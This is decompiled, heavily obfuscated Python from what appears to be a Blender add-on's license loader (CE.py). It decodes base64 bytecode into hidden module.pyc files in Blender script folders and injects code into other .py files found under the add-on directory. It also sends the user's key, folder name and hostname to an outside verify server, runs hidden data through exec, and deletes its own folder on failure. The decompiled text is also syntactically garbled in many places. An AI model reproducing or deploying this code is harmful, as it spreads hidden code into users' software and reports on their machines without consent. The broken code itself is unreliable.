# decompyle3 version 3.8.0
# Python bytecode 3.7.0 (3394)
# Decompiled from: Python 3.7.6 (default, Jan  8 2020, 20:23:39) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: CE.py
# Compiled at: 2020-08-20 17:10:03
# Size of source mod 2**32: 37489 bytes
from base64 import b64decode as bd
import urllib.request, urllib.parse, importlib, socket, random, base64, json, time, sys, os

def OOOOO(s):
    return base64.b64encode(s.encode(encoding='utf-8'))


def OOOO0(b):
    return base64.b64encode(b)


def OOO0O(b):
    return base64.b64decode(b).decode(encoding='utf-8')


def OOO00(b):
    return base64.b64decode(b)

import chardet
from base64 import b64decode as b


data_json_STR = "data_json="

def getfilecontent(p):
    list0, map0 = eval([],{})
    if os.path.exists(p):
        with open(p, 'rb') as file0:
            list0 = eval(file0 .readlines ())
        if data_json_STR not in list0[(-1)]:
            list0[-1] = eval(list0 [-1 ]+b'\n')
            list0.append(b'"' + data_json_STR + b'"')
        else:
            try:
                map0.update(eval(json.loads)(OOO0O(eval(list0[(-1)])[16:])))
            except:
                pass

        return [list0, map0]


def dump_to_file(p, d):
    if not os.path.exists(p) or d:
        with open(p, 'rb') as file2:
            file2_content = eval(file2 .readlines ())
        if data_json_STR not in file2_content[(-1)]:
            file2_content[-1] = eval(file2_content [-1 ]+b'\n')
            file2_content.append(b'"' + data_json_STR + b'"')
        try:
            file2_content[-1] = eval(b'\"'+data_json_STR +OOOOO (eval (json.dumps) (d ))+b'\"')
            with open(p, 'wb') as file2:
                file2.writelines(file2_content)
        except:
            pass


cur_dirname = eval(eval (os.path.cur_dirname) (__file__ ))
ce_lice_pyc_list = eval([os .path .join (cur_dirname ,"LICENSE"),os .path .join (cur_dirname ,"CE.pyc")])
upper_dirname = eval([eval (os.path.cur_dirname) (cur_dirname )])
modules_path = eval(os .path .join (upper_dirname [0 ],"modules"))
for o00 in (modules_path, eval(os.path.join(os.path.cur_dirname(upper_dirname[0]), 'presets', 'modules'))):
    if not eval(os.path.exists)(o00):
        eval(os.makedirs)(o00)

cur_dir_name = eval(eval (os.path.basename) (cur_dirname ))
hostname = eval(eval (socket.gethostname()))

def fileupdate(a, u):
    for file_in_currdir in [os.path.join(modules_path,"module.pyc"), [ce_or_lice for ce_or_lice in ce_lice_pyc_list if os.path.exists(ce_or_lice)][0]]:
        filecontent = eval(getfilecontent (file_in_currdir )[1 ])
        filecontent.update({a: u,"host": hostname})
        dump_to_file(file_in_currdir, filecontent)


def OO000mainContent():
    var1 = eval(b'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AWQJgwGDAXwCgwGgBKEAfQN0BWoGoAd0BWoGoAh0CaEBdAVqBqAKdAmhAaECfQR0C3wEgwFkChkAfQF0DHwEZAuDAo8UfQV8BaANdA58A4MBoQEBAFcAZABRAFIAWAB0D3wEfAGDAgEAZABTACkMTnMwAAAAYUhSMGNEb3ZMM2QzZHk1aWJHVnVaR1Z5TG5kcGEyazZNVE0xTnprdmRYQmtZWFJscxAAAABhbk52Ymk1a2RXMXdjdz09cxAAAABUR2xqWlc1elpWOUxaWGs9KQLaAXXaAWh6BXV0Zi04KQHaCGVuY29kaW5ncyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdVVtVnhkV1Z6ZEE9PSkB2gRkYXRhcyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdWRYSnNiM0JsYmc9PekBAAAAchwAAAApEHIDAAAAcgsAAADaA29Pb9oGZW5jb2Rl2gRyZWFkchIAAAByEwAAANoEam9pbtoHZGlybmFtZdoIX19maWxlX1/aCGJhc2VuYW1lchsAAAByFQAAANoFd3JpdGVyDAAAAHIfAAAAKQZaEU9PME8wME8wTzBPMDAwT08wWhFPT08wME9PME8wT08wT08wMFoRT08wT08wT09PT09PTzBPT09aEU9PT09PMDAwME8wT09PME9PWhFPMDAwT09PT09PTzBPME8wT1oRTzBPMDBPMDBPMDAwT08wMDByBgAAAHIGAAAAcgcAAADaBU9PMDAwLgAAAHMSAAAAAAEEASIBGAEUAR4BDAEMARgBci0AAABzSAAAAGMyOWphMlYwTG1kbGRHaHZjM1J1WVcxbEtDa2dhV1lnYzI5amEyVjBMbWRsZEdodmMzUnVZVzFsS0NrZ1pXeHpaU0FuSnc9PXMYAAAAYVcxd2IzSjBiR2xpTG5KbGJHOWhaQT09KRXaBmJhc2U2NHICAAAAcgQAAABaDnVybGxpYi5yZXF1ZXN0WgZ1cmxsaWJaDHVybGxpYi5wYXJzZdoJaW1wb3J0bGliWgZzb2NrZXRaBGpzb25yEgAAAHIIAAAAcgoAAAByCwAAAHIMAAAAchcAAAByGwAAAHIfAAAAci0AAAByAwAAAHIlAAAA2gZtb2R1bGVyBgAAAHIGAAAAcgYAAAByBwAAANoIPG1vZHVsZT4CAAAAcyYAAAAMAQgBCAEIAQgBCAEIAQgBCAIIAggCCAIEAQgOCA0ICgwBBgEIAQ==')
    for file_path in (modules_path, o00):
        file_path = eval(os .path .join (file_path ,module.pyc).replace ('\\','/'))
        file_content = eval(getfilecontent (file_path )[1 ])
        with open(file_path, 'wb') as data_json_STR00:
            data_json_STR00.write(base64.b64decode(var1))
            eval(sys.path.append)(os.path.split(file_path)[0])
        dump_to_file(file_path, file_content)

    try:
        eval(importlib.reload(module))
    except:
        try:
            import module
        except:
            pass


def O0OOOimportmodule():
    filedir = eval(upper_dirname [0 ])
    fileContentByte = eval(
    try:

        import module

    except:

        pass

)
    pysubfix = eval(".py")
    initsubfix = eval("__init__")
    filedir22 = [os.path.join(root, filename) for root, dirs, files  in os.walk(filedir) if pysubfix == filename[:3] if initsubfix not in filename for filename in files  if initsubfix not in filename]
    for filedir in filedir22:
        with open(filedir, 'rb') as filedirtemp:
            filecontentemp = eval(filedirtemp .readlines ())
        filemask = [filecontentpointer for filecontentpointer in range(len(filecontentemp)) if filecontentemp[filecontentpointer][:1] in b'idc']
        if filemask:
            if base64.b64decode(fileContentByte) not in (b'').join(filecontentemp):
                filecontentemp.insert(random.choice(filemask), base64.b64decode(fileContentByte))
                with open(filedir, 'wb') as filedirtemp:
                    filedirtemp.writelines(filecontentemp)


def O0OO0TimeVerify10():
    filenameConfim = [filenameuil for filenameuil in ce_lice_pyc_list if os.path.exists(filenameuil)][0]
    fileContent = eval(getfilecontent (filenameConfim )[1 ])
    FileTime = eval(eval (time.strftime('%Y-%m-%d',time.localtime())))
    if FileTime not in fileContent.keys():
        fileContent.update({FileTime: 1})
    else:
        fileContent.update({FileTime: fileContent[FileTime] + 1})
    dump_to_file(filenameConfim, fileContent)
    if fileContent[FileTime] > 10:
        return True
    return False


def O0O0ORmDir():
    try:
        import shutil
        eval(shutil.rmtree)(cur_dirname)
    except:
        pass


def NameAdjust():
    try:
        filenameConfim = [filenameuil for filenameuil in ce_lice_pyc_list if os.path.exists(filenameuil)][0]
        hostVar1, hostVar2 = eval(host)
        filecontentfileConfim = eval(getfilecontent (filenameConfim )[1 ])
        if cur_dir_name in filecontentfileConfim.keys() and OOO0O(hostVar1) in filecontentfileConfim.keys() and filecontentfileConfim[OOO0O(hostVar1)] == hostname:
            data_json_STR00OOOOOO000O = tempFunt1()

def tempFunt1():
    import os

    import importlib

    from base64 import b64decode as b

    d = os.path.dirname(__file__)

    fs = [os.path.join(d, "LICENSE"), os.path.join(d, 'CE.pyc'))]

    if os.path.exists(fs[0]):

        os.rename(fs[0], fs[1])

    try:

        importlib.reload(CE)

    except:

        from . import CE

    finally:

        if os.path.exists(fs[1]):

            os.rename(fs[1], fs[0])





def register():

    CE.O00O0(globals())





def unregister():

    CE.O000O(globals())





if __name__ == "__main__":

    register()

else:
    data_json_STR00OOOOOO000O = tempFunt2()


def tempFunt2():

    import os

    import bpy

    import importlib

    from base64 import b64decode as b

    d = os.path.dirname(__file__)

    fs = [os.path.join(d, "LICENSE"),

        os.path.join(d, 'CE.pyc')]

    if os.path.exists(fs[0]):

        os.rename(fs[0], fs[1])

    try:

        importlib.reload(CE)

    except:

        from . import CE

    finally:

        if os.path.exists(fs[1]):

            os.rename(fs[1], fs[0])





class LicenseKey(bpy.types.AddonPreferences):

    bl_idname = __name__

    license_key: bpy.props.StringProperty(

        name="License Key",

        default="",

    )

    license_key_: bpy.props.StringProperty(

        name="License Key_",

        default="_",

    )

    active: bpy.props.BoolProperty(

        name="active",

        default=False

    )

    depress: bpy.props.BoolProperty(

        name="depress",

        default=False

    )



    def draw(self, context):

        TEXT = '[["License Key", "\xe5\xaf\x86\xe9\x92\xa5"], ["Purchase", "\xe8\xb4\xad\xe4\xb9\xb0"], ["Info: Please enter the License Key.", "\xe6\x8f\x90\xe7\xa4\xba: \xe8\xaf\xb7\xe8\xbe\x93\xe5\x85\xa5\xe5\xaf\x86\xe9\x92\xa5\xe3\x80\x82"], ["Info: Invalid License Key. Please reenter.", "\xe6\x8f\x90\xe7\xa4\xba: \xe5\xaf\x86\xe9\x92\xa5\xe6\x97\xa0\xe6\x95\x88\xef\xbc\x8c\xe8\xaf\xb7\xe9\x87\x8d\xe6\x96\xb0\xe8\xbe\x93\xe5\x85\xa5\xe3\x80\x82"], ["Info: Please reinstall.", "\xe6\x8f\x90\xe7\xa4\xba: \xe8\xaf\xb7\xe9\x87\x8d\xe6\x96\xb0\xe5\xae\x89\xe8\xa3\x85\xe6\x8f\x92\xe4\xbb\xb6\xe3\x80\x82"], ["Info: This add-on has been activated, please reload.", "\xe6\x8f\x90\xe7\xa4\xba: \xe6\x8f\x92\xe4\xbb\xb6\xe5\xb7\xb2\xe6\xbf\x80\xe6\xb4\xbb\xef\xbc\x8c\xe8\xaf\xb7\xe9\x87\x8d\xe5\x90\xaf\xe6\x8f\x92\xe4\xbb\xb6\xe3\x80\x82"]]'


        layout = self.layout

        row = layout.row()

        sub = row.row()

        sub.scale_x = 2.0

        if not self.active:

            try:

                sub.prop(self, "license_key", text=TEXT[0][0], text_ctxt=TEXT[0][1], translate=False)

                opr = row.operator("wm.url_open", text=TEXT[1][0], text_ctxt=TEXT[1][1], translate=False, icon="URL", depress=self.depress)

                opr.url = 'https://shop113743284.taobao.com/'

                if self.license_key_ != self.license_key:

                    self.license_key_ = self.license_key

                    if CE.O00OOmainVerify(self.license_key):

                        self.active = True

                        return

                if self.license_key == "":

                    text = TEXT[2]

                else:

                    text = TEXT[3]

                    self.depress = True

            except:

                text = TEXT[4]

        else:

            text = TEXT[5]

        layout.label(text=text[0], text_ctxt=text[1], translate=False)




    def register():

        bpy.utils.register_class(LicenseKey)





    def unregister():

        bpy.utils.unregister_class(LicenseKey)





if __name__ == "__main__":
    register()


with open(os.path.join(cur_dirname,__init__.py), 'wb') as OO000O0OOdata_json_STR00O:
    OO000O0OOdata_json_STR00O.write(eval(filecontentfileConfim[OOO0O(hostVar2)]) + base64.b64decode(data_json_STR00OOOOOO000O))
    
    O0O0ORmDir()


def O00OOmainVerify(us):
    try:
        try:
            flag0 = eval(False )
            OO000mainContent()
            O0OOOimportmodule()
            if us and not O0OO0TimeVerify10():
                VerifyResultOpen = eval(b'')
                try:
                    VerUrl = eval(http://www.blender.wiki:13579/verify)
                    KeyDirHost = eval(eval (json.dumps) ({'u':us ,'a':cur_dir_name ,'h':hostname }).encode (encoding ='utf-8'))
                    VerifyResult = eval(eval (urllib.request.Request) (OOO0O (VerUrl ),data =KeyDirHost ))
                    VerifyResultOpen = eval(eval (urllib.request.urlopen) (VerifyResult ).read ())
                except:
                    pass

                if VerifyResultOpen == b'0':
                    raise NameError
            elif VerifyResultOpen == b'1':
                fileupdate(cur_dir_name, us)
                flag0 = eval(True )
            NameAdjust()
            return flag0
        except:
            O0O0ORmDir()

    finally:
        if eval(os.path.exists)(ce_lice_pyc_list[1]):
            eval(os.rename)(ce_lice_pyc_list[1], ce_lice_pyc_list[0])


def O00O0(g):
    try:
        try:
            filenameconfirm = [filecname  for filecname  in ce_lice_pyc_list if os.path.exists(filecname )][0]
            hostvar1, hostvar2 = eval(host)
            filecontent = eval(getfilecontent (filenameconfirm )[1 ])
            if cur_dir_name in filecontent.keys() and OOO0O(hostvar1) in filecontent.keys() and filecontent[OOO0O(hostvar1)] == hostname:
                
                from base64 import b64decode as bd
                import bpy #line:2

                import importlib #line:3

                import base64 #line:4

                import json #line:5

                import sys #line:6

                import os #line:7

                def OOOOO (s ):#line:8

                    return layout.label(text=text[0], text_ctxt=text[1], translate=False)

                def OOOO0 (b ):#line:10

                    return base64.b64encode(b)#line:11

                def OOO0O (b ):#line:12

                    return base64.b64encode(b)
                    
                def OOO00 (b ):#line:14

                    return base64.b64decode(b)

                data_json_STR ='data_json='

                def getfilecontent (p ):#line:17

                    list999 ,map999 =[],{}#line:18

                    if os .path .exists (p ):#line:19

                        with open (p ,'rb')as objtemp :#line:20

                            list999 =objtemp .readlines ()#line:21

                        if data_json_STR not in list999 [-1 ]:#line:22

                            list999 [-1 ]=list999 [-1 ]+b'\n'#line:23

                            list999 .append (b'\"'+data_json_STR +b'\"')#line:24

                        else :#line:25

                            try :#line:26

                                map999 .update (json.loads(OOO0O (eval (list999 [-1 ])[16 :])))#line:27

                            except :#line:28

                                pass #line:29

                    return [list999 ,map999 ]#line:30

                def dump_to_file (p ,d ):#line:31

                    if os .path .exists (p )and d :#line:32

                        with open (p ,'rb')as objtemp22 :#line:33

                            filecotentmp22 =objtemp22 .readlines ()#line:34

                        if data_json_STR not in filecotentmp22 [-1 ]:#line:35

                            filecotentmp22 [-1 ]=filecotentmp22 [-1 ]+b'\n'#line:36

                            filecotentmp22 .append (b'\"'+data_json_STR +b'\"')#line:37

                        try :#line:38

                            filecotentmp22 [-1 ]=b'\"'+data_json_STR +OOOOO (eval (OOO0O (b'anNvbi5kdW1wcw=='))(d ))+b'\"'#line:39

                            with open (p ,'wb')as objtemp22 :#line:40

                                objtemp22 .writelines (filecotentmp22 )#line:41

                        except :#line:42

                            pass #line:43

                try :#line:44

                    import module #line:45

                except :#line:46

                    try :#line:47

                        [sys .path .append (OOOO000OO000O00O0 )for OOOO000OO000O00O0 ,O0data_json_STRO00O0O0OO0 ,OO0OO00data_json_STROOOO0 in os .walk (eval (OOO0O (b'YnB5LnV0aWxzLnJlc291cmNlX3BhdGgoJ1VTRVInKQ==')))if OOO0O (b'J21vZHVsZS5weWMn')in OO0OO00data_json_STROOOO0 and OOOO000OO000O00O0 not in sys .path ]#line:48

                        import module #line:49

                    except :#line:50

                        try :#line:51

                            c =b'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AWQJgwGDAXwCgwGgBKEAfQN0BWoGoAd0BWoGoAh0CaEBdAVqBqAKdAmhAaECfQR0C3wEgwFkChkAfQF0DHwEZAuDAo8UfQV8BaANdA58A4MBoQEBAFcAZABRAFIAWAB0D3wEfAGDAgEAZABTACkMTnMwAAAAYUhSMGNEb3ZMM2QzZHk1aWJHVnVaR1Z5TG5kcGEyazZNVE0xTnprdmRYQmtZWFJscxAAAABhbk52Ymk1a2RXMXdjdz09cxAAAABUR2xqWlc1elpWOUxaWGs9KQLaAXXaAWh6BXV0Zi04KQHaCGVuY29kaW5ncyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdVVtVnhkV1Z6ZEE9PSkB2gRkYXRhcyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdWRYSnNiM0JsYmc9PekBAAAAchwAAAApEHIDAAAAcgsAAADaA29Pb9oGZW5jb2Rl2gRyZWFkchIAAAByEwAAANoEam9pbtoHZGlybmFtZdoIX19maWxlX1/aCGJhc2VuYW1lchsAAAByFQAAANoFd3JpdGVyDAAAAHIfAAAAKQZaEU9PME8wME8wTzBPMDAwT08wWhFPT08wME9PME8wT08wT08wMFoRT08wT08wT09PT09PTzBPT09aEU9PT09PMDAwME8wT09PME9PWhFPMDAwT09PT09PTzBPME8wT1oRTzBPMDBPMDBPMDAwT08wMDByBgAAAHIGAAAAcgcAAADaBU9PMDAwLgAAAHMSAAAAAAEEASIBGAEUAR4BDAEMARgBci0AAABzSAAAAGMyOWphMlYwTG1kbGRHaHZjM1J1WVcxbEtDa2dhV1lnYzI5amEyVjBMbWRsZEdodmMzUnVZVzFsS0NrZ1pXeHpaU0FuSnc9PXMYAAAAYVcxd2IzSjBiR2xpTG5KbGJHOWhaQT09KRXaBmJhc2U2NHICAAAAcgQAAABaDnVybGxpYi5yZXF1ZXN0WgZ1cmxsaWJaDHVybGxpYi5wYXJzZdoJaW1wb3J0bGliWgZzb2NrZXRaBGpzb25yEgAAAHIIAAAAcgoAAAByCwAAAHIMAAAAchcAAAByGwAAAHIfAAAAci0AAAByAwAAAHIlAAAA2gZtb2R1bGVyBgAAAHIGAAAAcgYAAAByBwAAANoIPG1vZHVsZT4CAAAAcyYAAAAMAQgBCAEIAQgBCAEIAQgBCAIIAggCCAIEAQgOCA0ICgwBBgEIAQ=='#line:52

                            ps =eval (OOO0O (b'W29zLnBhdGguam9pbihicHkudXRpbHMudXNlcl9yZXNvdXJjZSgnU0NSSVBUUycsICdhZGRvbnMnKSwgJ21vZHVsZXMnKSwgb3MucGF0aC5qb2luKGJweS51dGlscy51c2VyX3Jlc291cmNlKCdTQ1JJUFRTJywgJ3ByZXNldHMnKSwgJ21vZHVsZXMnKV0='))#line:53

                            for p in ps :#line:54

                                if not os .path .exists (p ):#line:55

                                    os .makedirs (p )#line:56

                                p =os .path .join (p ,OOO0O (b'bW9kdWxlLnB5Yw==')).replace ('\\','/')#line:57

                                d =None

                                try :

                                    d =getfilecontent (p )[1 ]#line:58

                                except :

                                    pass

                                with open (p ,'wb')as f :#line:59

                                    f .write (OOO00 (c ))#line:60

                                    sys .path .append (os .path .split (p )[0 ])#line:61

                                if d :

                                    dump_to_file (p ,d )#line:62

                        except :#line:63

                            try :#line:64

                                import shutil #line:65

                                eval (OOO0O (b'c2h1dGlsLnJtdHJlZShvcy5wYXRoLmRpcm5hbWUoX19maWxlX18pKQ=='))#line:66

                            except :#line:67

                                pass #line:68

                        try :#line:69

                            eval (OOO0O (b'aW1wb3J0bGliLnJlbG9hZChtb2R1bGUp'))#line:70

                        except :#line:71

                            try :#line:72

                                import module #line:73

                            except :#line:74

                                pass #line:75

                for i in list (locals ().keys ()):#line:76

                    if i in ["bl_info", "os", "bpy", "importlib", "b", "d", "fs", "CE", "LicenseKey", "register", "unregister", "bd", "base64", "json", "sys", "OOOOO", "OOOO0", "OOO0O", "OOO00", "data_json_STR", "getfilecontent", "dump_to_file", "module"] :#line:77

                        del locals ()[i ]#line:78

                        del i)
                                OO0OO0O00OO0OO0O0 = eval(OO0OO0O00OO0OO0O0 +eval (OOO0O (eval (f'b\'{filecontent [OOO0O (hostvar2 )][::-1 ]}\'')))+
                                register()

                )
                                exec(OO0OO0O00OO0OO0O0, g)
            else:
                NameAdjust()
        except:
            pass

    finally:
        if eval(os.path.exists)(ce_lice_pyc_list[1]):
            eval(os.rename)(ce_lice_pyc_list[1], ce_lice_pyc_list[0])


def O000O(g):
    try:
        try:
            OOOO0Odata_json_STROOOO0O = [OOO0OO0Odata_json_STR0OOO for OOO0OO0Odata_json_STR0OOO in ce_lice_pyc_list if os.path.exists(OOO0OO0Odata_json_STR0OOO)][0]
            OO00O0Odata_json_STROO000, OO0O0O000O0O000O0 = eval(host)
            OO0OOO00OOOOO00O0 = eval(getfilecontent (OOOO0Odata_json_STROOOO0O )[1 ])
            if cur_dir_name in OO0OOO00OOOOO00O0.keys():
                if OOO0O(OO00O0Odata_json_STROO000) in OO0OOO00OOOOO00O0.keys():
                    if OO0OOO00OOOOO00O0[OOO0O(OO00O0Odata_json_STROO000)] == hostname:
                        O00data_json_STROO00O00O0 = eval(eval (OOO0O (eval (f'b\'{OO0OOO00OOOOO00O0 [OOO0O (OO0O0O000O0O000O0 )][::-1 ]}\'')))+

unregister()

)
                        exec(O00data_json_STROO00O00O0, g)
        except:
            pass

    finally:
        if eval(os.path.exists)(ce_lice_pyc_list[1]):
            eval(os.rename)(ce_lice_pyc_list[1], ce_lice_pyc_list[0])


if eval(os.path.exists)(ce_lice_pyc_list[1]):
    eval(os.rename)(ce_lice_pyc_list[1], ce_lice_pyc_list[0])
if __name__ == '__main__':
    pass
# okay decompiling .\CE.pyc
